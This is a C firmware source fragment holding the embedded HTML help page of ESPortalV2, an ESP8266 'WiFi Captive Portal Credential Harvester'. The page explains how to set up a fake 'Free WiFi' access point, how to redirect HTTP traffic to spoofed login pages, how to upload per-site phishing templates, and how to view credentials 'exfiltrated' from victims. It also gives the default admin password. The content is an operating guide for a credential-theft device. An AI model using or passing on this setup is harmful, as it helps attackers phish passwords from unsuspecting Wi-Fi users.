const char HelpText[] PROGMEM = R"=====(
<!DOCTYPE HTML>
<html>
<head><title>ESPortal Help Page</title></head>
<body>
<a href="/esportal"><- BACK TO INDEX</a><br><br>
-----<br>
HELP<br>
-----<br>
<br>
ESPortalV2<br>
<br>
Created by Corey Harding<br>
www.LegacySecurityGroup.com / www.Exploit.Agency<br>
https://github.com/exploitagency/ESPortalV2<br>
<br>
ESPortal is a WiFi Captive Portal Credential Harvester for ESP8266 Devices.<br>
<br>
ESPortal is distributed under the MIT License. The license and copyright notice can not be removed and must be distributed alongside all future copies of the software.<br>
<br>
-----<br>
Accessing ESPortal Main Menu<br>
-----<br>
<br>
SSID: "Free WiFi"<br>
URL:  http://192.168.1.1/esportal<br>
<br>
-----<br>
Configure ESPortal<br>
-----<br>
<br>
Default credentials to access the configuration page:<br>
username "admin"<br>
password "hacktheplanet"<br>
<br>
WiFi Configuration<br>
<br>
Network Type<br>
Access Point Mode: Create a standalone access point(No Internet Connectivity-Requires Close Proximity)<br>
Join Existing Network: Join an existing network(Possible Internet Connectivity-Could use Device Remotely)<br>
<br>
Hidden: Choose whether or not to use a hidden SSID when creating an access point<br>
<br>
SSID: SSID of the access point to create or of the network you are choosing to join<br>
Password: Password of the access point which you wish to create or of the network you are choosing to join<br>
Channel: Channel of the access point you are creating<br>
<br>
IP: IP to set for ESPortal<br>
Gateway: Gateway to use, make it the same as ESPortal's IP if an access point or the same as the router if joining a network<br>
Subnet: Typically set to 255.255.255.0<br>
<br>
ESPortal Administration Settings:<br>
<br>
Username: Username to configure/upgrade ESPortal<br>
Password: Password to configure/upgrade ESPortal<br>
<br>
-----<br>
ESPortal Credential Harvester<br>
-----<br>
<br>
A social engineering attack vector.<br>
Redirects HTTP requests to a fake login page. 
Does not support HTTPS requests nor does it override cached HTTPS redirects.<br>
You can define a custom template for up to 3 specific domains, a welcome portal, and a catch-all.<br>
<br>
Example scenario: Setup ESPortalV2 to act as a free WiFi hotspot.<br>
<br>
Captured credentials are stored on the exfiltration page in the file corresponding to the URL.<br>
<br>
Custom html templates can be uploaded for the ESPortal login credential harvester via FTP.<br>
If a custom html template is found it will override the default settings.<br>
Upon deletion the default settings are automatically restored.<br>
<br>
The filenames must match the below exactly in order to apply a template override.<br>
captiveportal.html     -     The catch all that handles the redirects.(Would be rare to override this part)<br>
welcome.html           -     The welcome page for the "free wifi" hotspot.<br>
error.html             -     Display some sort of custom error when the user enters login credentials.<br>
spoof_other.html       -     The generic login credential harvester for a site not in the list.<br>
spoof_site1.html       -     The 1st login credential harvester site in the list with a custom layout.<br>
spoof_site2.html       -     The 2nd login credential harvester site in the list with a custom layout.<br>
spoof_site3.html       -     The 3rd login credential harvester site in the list with a custom layout.<br>
etc..<br>
<br>
NOTE: Modifying any ESPortal related setting requires a reboot of the ESPortal device.<br>
Do not leave any line blank or as a duplicate of another.<br>
<br>
-----<br>
List Exfiltrated Data<br>
-----<br>
<br>
Displays any data that has been collected from the victim using ESPortal's exfiltration methods.<br>
<br>
-----<br>
Format File System<br>
-----<br>
<br>
This will erase the contents of the SPIFFS file system including ALL Payloads that have been uploaded.<br>
Formatting may take up to 90 seconds.<br>
All current settings will be retained unless you reboot your device during this process.<br>
<br>
-----<br>
Upgrade ESPortal Firmware<br>
-----<br>
<br>
Authenticate using your username and password set in the configuration page.<br>
<br>
Default credentials to access the firmware upgrade page:<br>
username "admin"<br>
password "hacktheplanet"<br>
<br>
Select "Browse" choose the new firmware to be uploaded and then click "Upgrade".<br>
<br>
You will need to manually reset the device upon the browser alerting you that the upgrade was successful.<br>
<br>
-----<br>
Licensing Information<br>
-----<br>
<br>
ESPortalV2 by Corey Harding: https://www.LegacySecurityGroup.com<br>
Code available at: https://github.com/exploitagency/ESPortalV2<br>
ESPortalV2 software is licensed under the MIT License<br>
/*<br>
 MIT License<br>
<br>
 Copyright (c) [2017] [Corey Harding]<br>
<br>
 Permission is hereby granted, free of charge, to any person obtaining a copy<br>
 of this software and associated documentation files (the "Software"), to deal<br>
 in the Software without restriction, including without limitation the rights<br>
 to use, copy, modify, merge, publish, distribute, sublicense, and/or sell<br>
 copies of the Software, and to permit persons to whom the Software is<br>
 furnished to do so, subject to the following conditions:<br>
<br>
 The above copyright notice and this permission notice shall be included in all<br>
 copies or substantial portions of the Software.<br>
<br>
 THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR<br>
 IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,<br>
 FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE<br>
 AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER<br>
 LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,<br>
 OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE<br>
 SOFTWARE.<br>
*/<br><br>
<a href="/license">Click here for additional licensing information</a>
</body>
</html>
)=====";
